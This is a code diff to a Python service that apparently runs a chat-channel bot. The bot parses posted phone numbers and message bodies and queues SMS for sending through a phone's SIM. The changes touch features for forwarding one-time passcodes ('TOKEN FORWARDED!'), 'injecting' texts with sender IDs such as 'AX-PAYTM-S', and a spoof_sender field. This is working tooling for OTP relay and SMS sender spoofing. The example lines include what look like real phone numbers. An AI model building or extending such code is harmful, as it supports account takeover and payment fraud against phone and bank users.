@@ -14,7 +14,7 @@ def _extract_phone(raw: str) -> str:
 
 
 def parse_channel_outgoing(text: str) -> tuple[str | None, str | None]:
-    """Parse channel posts like: To: 9289240139 / Message: OTP body"""
+    """Parse channel posts: To:/Message:, multi-line, or '91XXXXXXXXXX body'."""
     cleaned = text.strip()
     to_match = re.search(r"(?:📞\s*)?To\s*:\s*([+\d\s()-]+)", cleaned, re.I)
     msg_match = re.search(
@@ -28,7 +28,6 @@ def parse_channel_outgoing(text: str) -> tuple[str | None, str | None]:
     if to_number and message:
         return to_number, message
 
-    # Fallback: first line number, rest is body
     lines = [line.strip() for line in cleaned.splitlines() if line.strip()]
     if len(lines) >= 2:
         maybe_number = _extract_phone(lines[0])
@@ -37,15 +36,40 @@ def parse_channel_outgoing(text: str) -> tuple[str | None, str | None]:
             if body:
                 return maybe_number, body
 
+    # Single line: 917290053434 OTP body here
+    parts = cleaned.split(None, 1)
+    if len(parts) == 2:
+        maybe_number = _extract_phone(parts[0])
+        if maybe_number and len(re.sub(r"\D", "", maybe_number)) >= 10:
+            body = parts[1].strip()
+            if body:
+                return maybe_number, body
+
     return None, None
 
 
+_BOT_MARKERS = (
+    "INJECT FORWARDED!",
+    "TOKEN FORWARDED!",
+    "OUTGOING SMS SENT!",
+    "✅ SUCCESS",
+    "⏱ queued",
+    "📋 Format:",
+)
+
+
 def prepare_sms_forward(sender: str, message: str) -> tuple[str, str]:
-    """Pass SMS through unchanged for /mynum inject — no labels, no sender prefix."""
+    """Pass SMS through unchanged for /mynum inject — sender ID + body only."""
     clean_sender = sender.strip()
     clean_message = message.strip()
 
-    # If a formatted bot/channel post was re-fed, unwrap to raw body only.
+    if any(marker in clean_message for marker in _BOT_MARKERS):
+        parsed_sender, parsed_body = parse_channel_message(clean_message)
+        if parsed_body:
+            clean_message = parsed_body.strip()
+        if parsed_sender:
+            clean_sender = parsed_sender.strip()
+
     if re.search(r"(?:From|FROM|Sender)\s*:", clean_message, re.I):
         parsed_sender, parsed_body = parse_channel_message(clean_message)
         if parsed_body:
@@ -53,7 +77,6 @@ def prepare_sms_forward(sender: str, message: str) -> tuple[str, str]:
         if parsed_sender:
             clean_sender = parsed_sender.strip()
 
-    # Never prepend sender into SMS body (e.g. "AX-PAYTM-S: OTP...").
     sender_prefix = f"{clean_sender}:"
     if clean_message.startswith(sender_prefix):
         clean_message = clean_message[len(sender_prefix) :].lstrip()
@@ -158,18 +181,14 @@ def queue_channel_sms(
     from app.services import normalize_phone
 
     to_number, outgoing_message = parse_channel_outgoing(channel_text)
-    spoof_sender = None
+    if not to_number or not outgoing_message:
+        raise ValueError(
+            "Channel format: 91XXXXXXXXXX message\n"
+            "ya To: number / Message: text"
+        )
 
-    if to_number and outgoing_message:
-        target = normalize_phone(to_number)
-        body = outgoing_message
-    else:
-        sender, message = parse_channel_message(channel_text)
-        if not profile.phone_number:
-            raise ValueError("Channel message mein To: / Message: nahi mila. Pehle /mynum set karo.")
-        target = profile.phone_number
-        body = message
-        spoof_sender = sender
+    target = normalize_phone(to_number)
+    body = outgoing_message.strip()
 
     sims = get_sim_list(device)
     sim_index = profile.selected_sim_index or 0
@@ -181,7 +200,7 @@ def queue_channel_sms(
         sim_index=sim_index,
         sim_slot=sim_slot,
         to_number=target,
-        spoof_sender=spoof_sender,
+        spoof_sender=None,
         message=body,
         channel_message_id=channel_message_id,
         status="pending",
